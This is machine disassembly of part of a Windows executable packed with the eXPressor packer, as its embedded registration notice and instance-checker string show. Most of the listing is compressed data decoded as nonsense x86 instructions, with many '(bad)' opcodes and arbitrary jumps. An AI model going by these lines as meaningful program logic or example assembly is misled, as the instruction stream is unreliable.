  406b99:	50                   	push   %eax
  406b9a:	9a 2c f0 5f 49 3c 8f 	lcall  $0x8f3c,$0x495ff02c
  406ba1:	c5 2d c7 95 c8 87    	lds    0x87c895c7,%ebp
  406ba7:	87 8a 66 f6 89 f2    	xchg   %ecx,-0xd76099a(%edx)
  406bad:	55                   	push   %ebp
  406bae:	cc                   	int3
  406baf:	b1 03                	mov    $0x3,%cl
  406bb1:	58                   	pop    %eax
  406bb2:	b4 b4                	mov    $0xb4,%ah
  406bb4:	08 25 25 82 25 35    	or     %ah,0x35258225
  406bba:	67 34 92             	addr16 xor $0x92,%al
  406bbd:	f5                   	cmc
  406bbe:	c2 22 59             	ret    $0x5922
  406bc1:	59                   	pop    %ecx
  406bc2:	d6                   	salc
  406bc3:	e6 0f                	out    %al,$0xf
  406bc5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406bc6:	1d 91 1b 19 e4       	sbb    $0xe4191b91,%eax
  406bcb:	e4 d9                	in     $0xd9,%al
  406bcd:	62 18                	bound  %ebx,(%eax)
  406bcf:	c5 c7 84             	(bad)
  406bd2:	bd 88 e9 a4 f0       	mov    $0xf0a4e988,%ebp
  406bd7:	8f 08 98 90          	(bad)
  406bdb:	88 6f ed             	mov    %ch,-0x13(%edi)
  406bde:	3c dd                	cmp    $0xdd,%al
  406be0:	7d 0a                	jge    0x406bec
  406be2:	6b 6c 6f 96 d3       	imul   $0xffffffd3,-0x6a(%edi,%ebp,2),%ebp
  406be7:	7d 08                	jge    0x406bf1
  406be9:	68 11 cb 6a 11       	push   $0x116acb11
  406bee:	d9 bb b8 1a 5f 55    	fnstcw 0x555f1ab8(%ebx)
  406bf4:	15 ba 8a 6f 05       	adc    $0x56f8aba,%eax
  406bf9:	75 22                	jne    0x406c1d
  406bfb:	b6 fb                	mov    $0xfb,%dh
  406bfd:	e5 f7                	in     $0xf7,%eax
  406bff:	61                   	popa
  406c00:	78 b7                	js     0x406bb9
  406c02:	79 ba                	jns    0x406bbe
  406c04:	85 83 5a 5b 61 90    	test   %eax,-0x6f9ea4a6(%ebx)
  406c0a:	ae                   	scas   %es:(%edi),%al
  406c0b:	d4 41                	aam    $0x41
  406c0d:	55                   	push   %ebp
  406c0e:	f7 46 40 a9 1f 86 9e 	testl  $0x9e861fa9,0x40(%esi)
  406c15:	51                   	push   %ecx
  406c16:	3d 8e 18 b2 67       	cmp    $0x67b2188e,%eax
  406c1b:	ef                   	out    %eax,(%dx)
  406c1c:	0d f8 10 3d 91       	or     $0x913d10f8,%eax
  406c21:	e8 d1 da 99 81       	call   0x81da46f7
  406c26:	30 83 e0 66 8d 67    	xor    %al,0x678d66e0(%ebx)
  406c2c:	5c                   	pop    %esp
  406c2d:	0f                   	lss    (bad),%edi
  406c2e:	b2 fc                	mov    $0xfc,%dl
  406c30:	6e                   	outsb  %ds:(%esi),(%dx)
  406c31:	12 f9                	adc    %cl,%bh
  406c33:	5f                   	pop    %edi
  406c34:	80 9d 61 c3 8e 7e c6 	sbbb   $0xc6,0x7e8ec361(%ebp)
  406c3b:	6a 00                	push   $0x0
  406c3d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c3e:	7a 82                	jp     0x406bc2
  406c40:	02 70 42             	add    0x42(%eax),%dh
  406c43:	3c bf                	cmp    $0xbf,%al
  406c45:	73 9b                	jae    0x406be2
  406c47:	e6 d3                	out    %al,$0xd3
  406c49:	ec                   	in     (%dx),%al
  406c4a:	77 0e                	ja     0x406c5a
  406c4c:	ec                   	in     (%dx),%al
  406c4d:	5d                   	pop    %ebp
  406c4e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c4f:	01 4c 64 db          	add    %ecx,-0x25(%esp,%eiz,2)
  406c53:	61                   	popa
  406c54:	bc 14 d1 9f d0       	mov    $0xd09fd114,%esp
  406c59:	20 57 f5             	and    %dl,-0xb(%edi)
  406c5c:	ef                   	out    %eax,(%dx)
  406c5d:	1e                   	push   %ds
  406c5e:	7f 71                	jg     0x406cd1
  406c60:	6d                   	insl   (%dx),%es:(%edi)
  406c61:	b5 ce                	mov    $0xce,%ch
  406c63:	62 26                	bound  %esp,(%esi)
  406c65:	5a                   	pop    %edx
  406c66:	d6                   	salc
  406c67:	ef                   	out    %eax,(%dx)
  406c68:	40                   	inc    %eax
  406c69:	0a 12                	or     (%edx),%dl
  406c6b:	33 17                	xor    (%edi),%edx
  406c6d:	60                   	pusha
  406c6e:	a2 58 05 7d 47       	mov    %al,0x477d0558
  406c73:	27                   	daa
  406c74:	e5 44                	in     $0x44,%eax
  406c76:	3b c2                	cmp    %edx,%eax
  406c78:	f0 0a 1d d8 a7 41 c4 	lock or 0xc441a7d8,%bl
  406c7f:	aa                   	stos   %al,%es:(%edi)
  406c80:	10 50 4e             	adc    %dl,0x4e(%eax)
  406c83:	2e 8f                	cs (bad)
  406c85:	af                   	scas   %es:(%edi),%eax
  406c86:	3d c7 40 f4 f4       	cmp    $0xf4f440c7,%eax
  406c8b:	c7 c0 f7 67 96 e1    	mov    $0xe19667f7,%eax
  406c91:	4a                   	dec    %edx
  406c92:	d3 ae 54 ae d6 31    	shrl   %cl,0x31d6ae54(%esi)
  406c98:	41                   	inc    %ecx
  406c99:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406c9a:	57                   	push   %edi
  406c9b:	0e                   	push   %cs
  406c9c:	89 1e                	mov    %ebx,(%esi)
  406c9e:	e4 06                	in     $0x6,%al
  406ca0:	78 c0                	js     0x406c62
  406ca2:	82 dd 40             	sbb    $0x40,%ch
  406ca5:	e8 98 80 f1 05       	call   0x631ed42
  406caa:	b4 a8                	mov    $0xa8,%ah
  406cac:	12 65 7b             	adc    0x7b(%ebp),%ah
  406caf:	b4 54                	mov    $0x54,%ah
  406cb1:	a8 80                	test   $0x80,%al
  406cb3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406cb4:	8e 8e 5d 72 28 2b    	mov    0x2b28725d(%esi),%cs
  406cba:	34 0d                	xor    $0xd,%al
  406cbc:	76 c9                	jbe    0x406c87
  406cbe:	e8 ba e6 20 76       	call   0x7661537d
  406cc3:	38 c3                	cmp    %al,%bl
  406cc5:	74 cb                	je     0x406c92
  406cc7:	f2 85 90 f9 01 a3 45 	repnz test %edx,0x45a301f9(%eax)
  406cce:	57                   	push   %edi
  406ccf:	d1 8c 3a 88 ce 14 39 	rorl   $1,0x3914ce88(%edx,%edi,1)
  406cd6:	b8 34 7c b7 7a       	mov    $0x7ab77c34,%eax
  406cdb:	0b a2 f4 81 a3 68    	or     0x68a381f4(%edx),%esp
  406ce1:	46                   	inc    %esi
  406ce2:	66 74 2c             	data16 je 0x406d11
  406ce5:	3e d9 c6             	ds fld %st(6)
  406ce8:	93                   	xchg   %eax,%ebx
  406ce9:	d3 37                	shll   %cl,(%edi)
  406ceb:	38 09                	cmp    %cl,(%ecx)
  406ced:	a0 d5 02 c9 6b       	mov    0x6bc902d5,%al
  406cf2:	81 09 ff db 80 f8    	orl    $0xf880dbff,(%ecx)
  406cf8:	b3 c6                	mov    $0xc6,%bl
  406cfa:	4b                   	dec    %ebx
  406cfb:	e9 b9 17 6f 57       	jmp    0x57af84b9
  406d00:	17                   	pop    %ss
  406d01:	31 da                	xor    %ebx,%edx
  406d03:	04 03                	add    $0x3,%al
  406d05:	50                   	push   %eax
  406d06:	b5 29                	mov    $0x29,%ch
  406d08:	eb b8                	jmp    0x406cc2
  406d0a:	b1 61                	mov    $0x61,%cl
  406d0c:	4d                   	dec    %ebp
  406d0d:	52                   	push   %edx
  406d0e:	72 41                	jb     0x406d51
  406d10:	67 2d 4f e5 17 31    	addr16 sub $0x3117e54f,%eax
  406d16:	8c 38                	mov    %?,(%eax)
  406d18:	72 c3                	jb     0x406cdd
  406d1a:	32 ed                	xor    %ch,%ch
  406d1c:	44                   	inc    %esp
  406d1d:	84 7c 83 df          	test   %bh,-0x21(%ebx,%eax,4)
  406d21:	44                   	inc    %esp
  406d22:	66 21 7a da          	and    %di,-0x26(%edx)
  406d26:	7b 36                	jnp    0x406d5e
  406d28:	39 0f                	cmp    %ecx,(%edi)
  406d2a:	f5                   	cmc
  406d2b:	54                   	push   %esp
  406d2c:	10 27                	adc    %ah,(%edi)
  406d2e:	f6 8f 90 ac ad 7c ce 	testb  $0xce,0x7cadac90(%edi)
  406d35:	4a                   	dec    %edx
  406d36:	d0 a5 3d a9 08 9a    	shlb   $1,-0x65f756c3(%ebp)
  406d3c:	3b 9c 38 9e 11 b4 e8 	cmp    -0x174bee62(%eax,%edi,1),%ebx
  406d43:	03 fd                	add    %ebp,%edi
  406d45:	72 17                	jb     0x406d5e
  406d47:	d4 f1                	aam    $0xf1
  406d49:	52                   	push   %edx
  406d4a:	c8 ea 74 f9          	enter  $0x74ea,$0xf9
  406d4e:	e2 d2                	loop   0x406d22
  406d50:	b1 b6                	mov    $0xb6,%cl
  406d52:	b9 6c 04 c8 3a       	mov    $0x3ac8046c,%ecx
  406d57:	ba 55 fc ab d5       	mov    $0xd5abfc55,%edx
  406d5c:	69 18 9e 75 0f 7c    	imul   $0x7c0f759e,(%eax),%ebx
  406d62:	9e                   	sahf
  406d63:	6f                   	outsl  %ds:(%esi),(%dx)
  406d64:	2e 37                	cs aaa
  406d66:	be 0a e0 78 93       	mov    $0x9378e00a,%esi
  406d6b:	ec                   	in     (%dx),%al
  406d6c:	e3 71                	jecxz  0x406ddf
  406d6e:	1a e2                	sbb    %dl,%ah
  406d70:	59                   	pop    %ecx
  406d71:	f6 22                	mulb   (%edx)
  406d73:	37                   	aaa
  406d74:	56                   	push   %esi
  406d75:	21 9a 06 59 9b 9f    	and    %ebx,-0x6064a6fa(%edx)
  406d7b:	85 ff                	test   %edi,%edi
  406d7d:	3b 90 e1 2e 55 d2    	cmp    -0x2daad11f(%eax),%edx
  406d83:	77 0a                	ja     0x406d8f
  406d85:	5c                   	pop    %esp
  406d86:	04 62                	add    $0x62,%al
  406d88:	93                   	xchg   %eax,%ebx
  406d89:	3f                   	aas
  406d8a:	eb 4c                	jmp    0x406dd8
  406d8c:	f5                   	cmc
  406d8d:	3f                   	aas
  406d8e:	e4 ef                	in     $0xef,%al
  406d90:	73 90                	jae    0x406d22
  406d92:	2a af 26 ef a2 59    	sub    0x59a2ef26(%edi),%ch
  406d98:	76 31                	jbe    0x406dcb
  406d9a:	21 e9                	and    %ebp,%ecx
  406d9c:	ae                   	scas   %es:(%edi),%al
  406d9d:	77 eb                	ja     0x406d8a
  406d9f:	83 d7 63             	adc    $0x63,%edi
  406da2:	9d                   	popf
  406da3:	e7 98                	out    %eax,$0x98
  406da5:	cd 71                	int    $0x71
  406da7:	b6 a9                	mov    $0xa9,%dh
  406da9:	83 e6 d9             	and    $0xffffffd9,%esi
  406dac:	f5                   	cmc
  406dad:	56                   	push   %esi
  406dae:	ae                   	scas   %es:(%edi),%al
  406daf:	1c 6d                	sbb    $0x6d,%al
  406db1:	8c 5c b6 2a          	mov    %ds,0x2a(%esi,%esi,4)
  406db5:	d3 fd                	sar    %cl,%ebp
  406db7:	5d                   	pop    %ebp
  406db8:	c0 49 a4 38          	rorb   $0x38,-0x5c(%ecx)
  406dbc:	21 c3                	and    %eax,%ebx
  406dbe:	a9 75 44 88 d5       	test   $0xd5884475,%eax
  406dc3:	48                   	dec    %eax
  406dc4:	e5 ca                	in     $0xca,%eax
  406dc6:	d3 48 65             	rorl   %cl,0x65(%eax)
  406dc9:	30 49 3b             	xor    %cl,0x3b(%ecx)
  406dcc:	cb                   	lret
  406dcd:	f8                   	clc
  406dce:	f3 4d                	repz dec %ebp
  406dd0:	84 b5 0a a5 c1 c4    	test   %dh,-0x3b3e5af6(%ebp)
  406dd6:	51                   	push   %ecx
  406dd7:	1a 30                	sbb    (%eax),%dh
  406dd9:	72 8c                	jb     0x406d67
  406ddb:	67 c4                	addr16 (bad)
  406ddd:	d8 8f 81 6f 66 4f    	fmuls  0x4f666f81(%edi)
  406de3:	08 ec                	or     %ch,%ah
  406de5:	9a b5 9c d5 74 a4 c6 	lcall  $0xc6a4,$0x74d59cb5
  406dec:	65 40                	gs inc %eax
  406dee:	23 46 0f             	and    0xf(%esi),%eax
  406df1:	9d                   	popf
  406df2:	b6 8f                	mov    $0x8f,%dh
  406df4:	59                   	pop    %ecx
  406df5:	ce                   	into
  406df6:	6b 12 26             	imul   $0x26,(%edx),%edx
  406df9:	64 c8 02 b6 a2       	fs enter $0xb602,$0xa2
  406dfe:	27                   	daa
  406dff:	5b                   	pop    %ebx
  406e00:	c6                   	(bad)
  406e01:	19 41 4c             	sbb    %eax,0x4c(%ecx)
  406e04:	68 8b fe 46 df       	push   $0xdf46fe8b
  406e09:	f4                   	hlt
  406e0a:	59                   	pop    %ecx
  406e0b:	8a 51 1d             	mov    0x1d(%ecx),%dl
  406e0e:	78 85                	js     0x406d95
  406e10:	33 6d 56             	xor    0x56(%ebp),%ebp
  406e13:	92                   	xchg   %eax,%edx
  406e14:	30 f6                	xor    %dh,%dh
  406e16:	e6 e6                	out    %al,$0xe6
  406e18:	ba 4b f4 7a 79       	mov    $0x797af44b,%edx
  406e1d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e1e:	57                   	push   %edi
  406e1f:	bd 24 f7 e5 e3       	mov    $0xe3e5f724,%ebp
  406e24:	1c 4a                	sbb    $0x4a,%al
  406e26:	48                   	dec    %eax
  406e27:	b3 54                	mov    $0x54,%bl
  406e29:	e7 ef                	out    %eax,$0xef
  406e2b:	67 b0 14             	addr16 mov $0x14,%al
  406e2e:	bb 86 fe 10 bc       	mov    $0xbc10fe86,%ebx
  406e33:	b1 bf                	mov    $0xbf,%cl
  406e35:	18 d4                	sbb    %dl,%ah
  406e37:	f1                   	int1
  406e38:	eb dc                	jmp    0x406e16
  406e3a:	09 e9                	or     %ebp,%ecx
  406e3c:	23 03                	and    (%ebx),%eax
  406e3e:	3a 3f                	cmp    (%edi),%bh
  406e40:	87 d5                	xchg   %edx,%ebp
  406e42:	e8 1a 97 5b 72       	call   0x729c0561
  406e47:	07                   	pop    %es
  406e48:	c4                   	(bad)
  406e49:	c6 38                	xabort $0x38,(bad)
  406e4b:	8e 54 60 c9          	mov    -0x37(%eax,%eiz,2),%ss
  406e4f:	86 1b                	xchg   %bl,(%ebx)
  406e51:	ca bd d2             	lret   $0xd2bd
  406e54:	98                   	cwtl
  406e55:	b6 eb                	mov    $0xeb,%dh
  406e57:	96                   	xchg   %eax,%esi
  406e58:	52                   	push   %edx
  406e59:	9e                   	sahf
  406e5a:	cd 4d                	int    $0x4d
  406e5c:	b8 df 57 e9 a8       	mov    $0xa8e957df,%eax
  406e61:	9f                   	lahf
  406e62:	5d                   	pop    %ebp
  406e63:	2a 19                	sub    (%ecx),%bl
  406e65:	43                   	inc    %ebx
  406e66:	32 60 82             	xor    -0x7e(%eax),%ah
  406e69:	f9                   	stc
  406e6a:	40                   	inc    %eax
  406e6b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406e6c:	0b ba a9 56 30 71    	or     0x713056a9(%edx),%edi
  406e72:	8d 6a 7c             	lea    0x7c(%edx),%ebp
  406e75:	59                   	pop    %ecx
  406e76:	9e                   	sahf
  406e77:	df 75 f0             	fbstp  -0x10(%ebp)
  406e7a:	1f                   	pop    %ds
  406e7b:	9c                   	pushf
  406e7c:	e3 3b                	jecxz  0x406eb9
  406e7e:	5f                   	pop    %edi
  406e7f:	8e 0e                	mov    (%esi),%cs
  406e81:	98                   	cwtl
  406e82:	64 a7                	cmpsl  %es:(%edi),%fs:(%esi)
  406e84:	26 4b                	es dec %ebx
  406e86:	c5 f8 38             	(bad)
  406e89:	a2 63 bd 64 fd       	mov    %al,0xfd64bd63
  406e8e:	57                   	push   %edi
  406e8f:	73 9b                	jae    0x406e2c
  406e91:	b1 54                	mov    $0x54,%cl
  406e93:	bd 31 55 ed 0f       	mov    $0xfed5531,%ebp
  406e98:	01 b0 12 4f 31 13    	add    %esi,0x13314f12(%eax)
  406e9e:	69 67 a7 6e 83 6b c3 	imul   $0xc36b836e,-0x59(%edi),%esp
  406ea5:	e6 a0                	out    %al,$0xa0
  406ea7:	ce                   	into
  406ea8:	ba b6 80 e8 61       	mov    $0x61e880b6,%edx
  406ead:	7b 41                	jnp    0x406ef0
  406eaf:	34 3b                	xor    $0x3b,%al
  406eb1:	83 5a 9a 1b          	sbbl   $0x1b,-0x66(%edx)
  406eb5:	8e 68 d9             	mov    -0x27(%eax),%gs
  406eb8:	de a2 38 a8 c1 fb    	fisubs -0x43e57c8(%edx)
  406ebe:	c8 c3 2e 5e          	enter  $0x2ec3,$0x5e
  406ec2:	00 00                	add    %al,(%eax)
  406ec4:	80 00 00             	addb   $0x0,(%eax)
  406ec7:	00 6d 48             	add    %ch,0x48(%ebp)
  406eca:	31 db                	xor    %ebx,%ebx
  406ecc:	8d ad 88 6b 97 45    	lea    0x45976b88(%ebp),%ebp
  406ed2:	3a e5                	cmp    %ch,%ah
  406ed4:	70 1a                	jo     0x406ef0
  406ed6:	78 95                	js     0x406e6d
  406ed8:	5b                   	pop    %ebx
  406ed9:	b7 e6                	mov    $0xe6,%bh
  406edb:	f9                   	stc
  406edc:	d9 a2 c1 9c 5f e1    	fldenv -0x1ea0633f(%edx)
  406ee2:	1f                   	pop    %ds
  406ee3:	d9 ba 05 ad 3f 26    	fnstcw 0x263fad05(%edx)
  406ee9:	8a 1b                	mov    (%ebx),%bl
  406eeb:	c2 a1 0d             	ret    $0xda1
  406eee:	1f                   	pop    %ds
  406eef:	37                   	aaa
  406ef0:	08 bc 4c 41 57 32 be 	or     %bh,-0x41cda8bf(%esp,%ecx,2)
  406ef7:	ef                   	out    %eax,(%dx)
  406ef8:	b9 22 f9 c6 13       	mov    $0x13c6f922,%ecx
  406efd:	83 77 35 53          	xorl   $0x53,0x35(%edi)
  406f01:	b7 f7                	mov    $0xf7,%bh
  406f03:	46                   	inc    %esi
  406f04:	ba 0f 0e d0 f2       	mov    $0xf2d00e0f,%edx
  406f09:	d9 66 7a             	fldenv 0x7a(%esi)
  406f0c:	34 1f                	xor    $0x1f,%al
  406f0e:	7f e4                	jg     0x406ef4
  406f10:	48                   	dec    %eax
  406f11:	0b 8b 5b 4f bb 63    	or     0x63bb4f5b(%ebx),%ecx
  406f17:	84 6e 0d             	test   %ch,0xd(%esi)
  406f1a:	ae                   	scas   %es:(%edi),%al
  406f1b:	8e 54 a2 b6          	mov    -0x4a(%edx,%eiz,4),%ss
  406f1f:	29 f6                	sub    %esi,%esi
  406f21:	f5                   	cmc
  406f22:	f0 e6 95             	lock out %al,$0x95
  406f25:	f5                   	cmc
  406f26:	e2 a5                	loop   0x406ecd
  406f28:	ab                   	stos   %eax,%es:(%edi)
  406f29:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406f2a:	df b0 aa cc d9 c2    	fbstp  -0x3d263356(%eax)
  406f30:	03 5a c1             	add    -0x3f(%edx),%ebx
  406f33:	58                   	pop    %eax
  406f34:	09 8e 16 23 ae a8    	or     %ecx,-0x5751dcea(%esi)
  406f3a:	e6 05                	out    %al,$0x5
  406f3c:	94                   	xchg   %eax,%esp
  406f3d:	ed                   	in     (%dx),%eax
  406f3e:	f2 83 24 fd 59 c3 7a 	repnz andl $0xa,0x17ac359(,%edi,8)
  406f45:	01 0a 
  406f47:	22 38                	and    (%eax),%bh
  406f49:	55                   	push   %ebp
  406f4a:	9e                   	sahf
  406f4b:	e2 ff                	loop   0x406f4c
  406f4d:	0b 10                	or     (%eax),%edx
  406f4f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406f50:	5e                   	pop    %esi
  406f51:	18 a4 b5 08 55 41 9b 	sbb    %ah,-0x64beaaf8(%ebp,%esi,4)
  406f58:	9a 7f 9e fb 64 a4 bc 	lcall  $0xbca4,$0x64fb9e7f
  406f5f:	7c 27                	jl     0x406f88
  406f61:	bd 49 14 04 82       	mov    $0x82041449,%ebp
  406f66:	97                   	xchg   %eax,%edi
  406f67:	eb 4a                	jmp    0x406fb3
  406f69:	40                   	inc    %eax
  406f6a:	f0 7e f4             	lock jle 0x406f61
  406f6d:	c2 15 87             	ret    $0x8715
  406f70:	b9 16 2d 76 18       	mov    $0x18762d16,%ecx
  406f75:	ac                   	lods   %ds:(%esi),%al
  406f76:	43                   	inc    %ebx
  406f77:	7f 31                	jg     0x406faa
  406f79:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406f7a:	8f                   	(bad)
  406f7b:	bd 8a e0 72 36       	mov    $0x3672e08a,%ebp
  406f80:	13 89 12 f7 e5 92    	adc    -0x6d1a08ee(%ecx),%ecx
  406f86:	5d                   	pop    %ebp
  406f87:	bc 8d 23 a2 69       	mov    $0x69a2238d,%esp
  406f8c:	42                   	inc    %edx
  406f8d:	4a                   	dec    %edx
  406f8e:	86 65 73             	xchg   %ah,0x73(%ebp)
  406f91:	80 0e 4b             	orb    $0x4b,(%esi)
  406f94:	27                   	daa
  406f95:	89 4f 8a             	mov    %ecx,-0x76(%edi)
  406f98:	c6                   	(bad)
  406f99:	99                   	cltd
  406f9a:	f8                   	clc
  406f9b:	49                   	dec    %ecx
  406f9c:	84 ac ef 60 ef ac 04 	test   %ch,0x4acef60(%edi,%ebp,8)
  406fa3:	14 9f                	adc    $0x9f,%al
  406fa5:	f3 0e                	repz push %cs
  406fa7:	da 59 bd             	ficompl -0x43(%ecx)
  406faa:	86 51 04             	xchg   %dl,0x4(%ecx)
  406fad:	d6                   	salc
  406fae:	e9 5a 98 6e 60       	jmp    0x60af080d
  406fb3:	39 89 99 d4 ec 25    	cmp    %ecx,0x25ecd499(%ecx)
  406fb9:	85 7d c5             	test   %edi,-0x3b(%ebp)
  406fbc:	e7 20                	out    %eax,$0x20
  406fbe:	e1 f6                	loope  0x406fb6
  406fc0:	c1 c9 a7             	ror    $0xa7,%ecx
  406fc3:	87 61 38             	xchg   %esp,0x38(%ecx)
  406fc6:	36 df ff             	ss (bad)
  406fc9:	7c 13                	jl     0x406fde
  406fcb:	60                   	pusha
	...

Disassembly of section .ex_cod:

00407000 <.ex_cod>:
  407000:	5c                   	pop    %esp
  407001:	14 00                	adc    $0x0,%al
	...
  407023:	00 88 83 00 00 96    	add    %cl,-0x69ffff7d(%eax)
  407029:	83 00 00             	addl   $0x0,(%eax)
  40702c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40702d:	83 00 00             	addl   $0x0,(%eax)
  407030:	b6 83                	mov    $0x83,%dh
  407032:	00 00                	add    %al,(%eax)
  407034:	c6 83 00 00 d4 83 00 	movb   $0x0,-0x7c2c0000(%ebx)
  40703b:	00 e6                	add    %ah,%dh
  40703d:	83 00 00             	addl   $0x0,(%eax)
  407040:	f8                   	clc
  407041:	83 00 00             	addl   $0x0,(%eax)
  407044:	0c 84                	or     $0x84,%al
  407046:	00 00                	add    %al,(%eax)
  407048:	1e                   	push   %ds
  407049:	84 00                	test   %al,(%eax)
  40704b:	00 00                	add    %al,(%eax)
  40704d:	00 00                	add    %al,(%eax)
  40704f:	00 42 84             	add    %al,-0x7c(%edx)
  407052:	00 00                	add    %al,(%eax)
  407054:	00 00                	add    %al,(%eax)
  407056:	00 00                	add    %al,(%eax)
  407058:	65 58                	gs pop %eax
  40705a:	50                   	push   %eax
  40705b:	72 65                	jb     0x4070c2
  40705d:	73 73                	jae    0x4070d2
  40705f:	6f                   	outsl  %ds:(%esi),(%dx)
  407060:	72 5f                	jb     0x4070c1
  407062:	49                   	dec    %ecx
  407063:	6e                   	outsb  %ds:(%esi),(%dx)
  407064:	73 74                	jae    0x4070da
  407066:	61                   	popa
  407067:	6e                   	outsb  %ds:(%esi),(%dx)
  407068:	63 65 43             	arpl   %esp,0x43(%ebp)
  40706b:	68 65 63 6b 65       	push   $0x656b6365
  407070:	72 5f                	jb     0x4070d1
  407072:	00 00                	add    %al,(%eax)
  407074:	00 00                	add    %al,(%eax)
  407076:	00 00                	add    %al,(%eax)
  407078:	54                   	push   %esp
  407079:	68 69 73 20 61       	push   $0x61207369
  40707e:	70 70                	jo     0x4070f0
  407080:	6c                   	insb   (%dx),%es:(%edi)
  407081:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407088:	20 77 61             	and    %dh,0x61(%edi)
  40708b:	73 20                	jae    0x4070ad
  40708d:	70 61                	jo     0x4070f0
  40708f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407092:	64 20 77 69          	and    %dh,%fs:0x69(%edi)
  407096:	74 68                	je     0x407100
  407098:	20 61 6e             	and    %ah,0x6e(%ecx)
  40709b:	20 55 6e             	and    %dl,0x6e(%ebp)
  40709e:	72 65                	jb     0x407105
  4070a0:	67 69 73 74 65 72 65 	imul   $0x64657265,0x74(%bp,%di),%esi
  4070a7:	64 
  4070a8:	20 76 65             	and    %dh,0x65(%esi)
  4070ab:	72 73                	jb     0x407120
  4070ad:	69 6f 6e 20 6f 66 20 	imul   $0x20666f20,0x6e(%edi),%ebp
  4070b4:	65 58                	gs pop %eax
  4070b6:	50                   	push   %eax
  4070b7:	72 65                	jb     0x40711e
  4070b9:	73 73                	jae    0x40712e
  4070bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4070bc:	72 2e                	jb     0x4070ec
  4070be:	0a 46 6f             	or     0x6f(%esi),%al
  4070c1:	72 20                	jb     0x4070e3
  4070c3:	72 65                	jb     0x40712a
  4070c5:	67 69 73 74 72 61 74 	imul   $0x69746172,0x74(%bp,%di),%esi
  4070cc:	69 
  4070cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4070cf:	2c 20                	sub    $0x20,%al
  4070d1:	70 6c                	jo     0x40713f
  4070d3:	65 61                	gs popa
  4070d5:	73 65                	jae    0x40713c
  4070d7:	20 76 69             	and    %dh,0x69(%esi)
  4070da:	73 69                	jae    0x407145
  4070dc:	74 20                	je     0x4070fe
  4070de:	77 77                	ja     0x407157
  4070e0:	77 2e                	ja     0x407110
  4070e2:	63 67 73             	arpl   %esp,0x73(%edi)
  4070e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4070e6:	66 74 6c             	data16 je 0x407155
  4070e9:	61                   	popa
  4070ea:	62 73 2e             	bound  %esi,0x2e(%ebx)
  4070ed:	72 6f                	jb     0x40715e
  4070ef:	00 49 6e             	add    %cl,0x6e(%ecx)
  4070f2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4070f4:	00 00                	add    %al,(%eax)
  4070f6:	00 00                	add    %al,(%eax)
  4070f8:	5e                   	pop    %esi
  4070f9:	00 00                	add    %al,(%eax)
  4070fb:	80 00 00             	addb   $0x0,(%eax)
  4070fe:	24 9b                	and    $0x9b,%al
  407100:	88 c7                	mov    %al,%bh
  407102:	1e                   	push   %ds
  407103:	7b 91                	jnp    0x407096
  407105:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407106:	65 62 74 54 18       	bound  %esi,%gs:0x18(%esp,%edx,2)
  40710b:	28 0c d4             	sub    %cl,(%esp,%edx,8)
  40710e:	42                   	inc    %edx
  40710f:	22 93 cf 54 af 14    	and    0x14af54cf(%ebx),%dl
  407115:	48                   	dec    %eax
  407116:	a8 4e                	test   $0x4e,%al
  407118:	d5 14                	aad    $0x14
  40711a:	c1 ba 57 a7 b1 0d c9 	sarl   $0xc9,0xdb1a757(%edx)
  407121:	e6 24                	out    %al,$0x24
  407123:	8d a4 28 79 0b 7b f1 	lea    -0xe84f487(%eax,%ebp,1),%esp
  40712a:	8c 84 2f c2 ea 86 0d 	mov    %es,0xd86eac2(%edi,%ebp,1)
  407131:	99                   	cltd
  407132:	28 5d e1             	sub    %bl,-0x1f(%ebp)
  407135:	ee                   	out    %al,(%dx)
  407136:	c0 80 f7 29 f1 ae 0a 	rolb   $0xa,-0x510ed609(%eax)
  40713d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40713f:	4f                   	dec    %edi
  407140:	b8 e7 cb 0f 61       	mov    $0x610fcbe7,%eax
  407145:	09 ef                	or     %ebp,%edi
  407147:	1c 8c                	sbb    $0x8c,%al
  407149:	9f                   	lahf
  40714a:	b0 e9                	mov    $0xe9,%al
  40714c:	33 3d f4 ed 25 2c    	xor    0x2c25edf4,%edi
  407152:	08 0a                	or     %cl,(%edx)
  407154:	ea a8 61 ee d9 13 79 	ljmp   $0x7913,$0xd9ee61a8
  40715b:	f4                   	hlt
  40715c:	9d                   	popf
  40715d:	1e                   	push   %ds
  40715e:	f1                   	int1
  40715f:	d1 26                	shll   $1,(%esi)
  407161:	53                   	push   %ebx
  407162:	52                   	push   %edx
  407163:	d6                   	salc
  407164:	f1                   	int1
  407165:	58                   	pop    %eax
  407166:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407167:	c8 db b9 47          	enter  $0xb9db,$0x47
  40716b:	17                   	pop    %ss
  40716c:	43                   	inc    %ebx
  40716d:	b4 43                	mov    $0x43,%ah
  40716f:	1e                   	push   %ds
  407170:	85 51 a1             	test   %edx,-0x5f(%ecx)
  407173:	50                   	push   %eax
  407174:	52                   	push   %edx
  407175:	d3 f8                	sar    %cl,%eax
  407177:	d1 c0                	rol    $1,%eax
  407179:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40717a:	9f                   	lahf
  40717b:	4d                   	dec    %ebp
  40717c:	fa                   	cli
  40717d:	40                   	inc    %eax
  40717e:	14 e5                	adc    $0xe5,%al
  407180:	71 6b                	jno    0x4071ed
  407182:	3a fc                	cmp    %ah,%bh
  407184:	c8 8c f3 c5          	enter  $0xf38c,$0xc5
  407188:	5a                   	pop    %edx
  407189:	e5 f0                	in     $0xf0,%eax
  40718b:	16                   	push   %ss
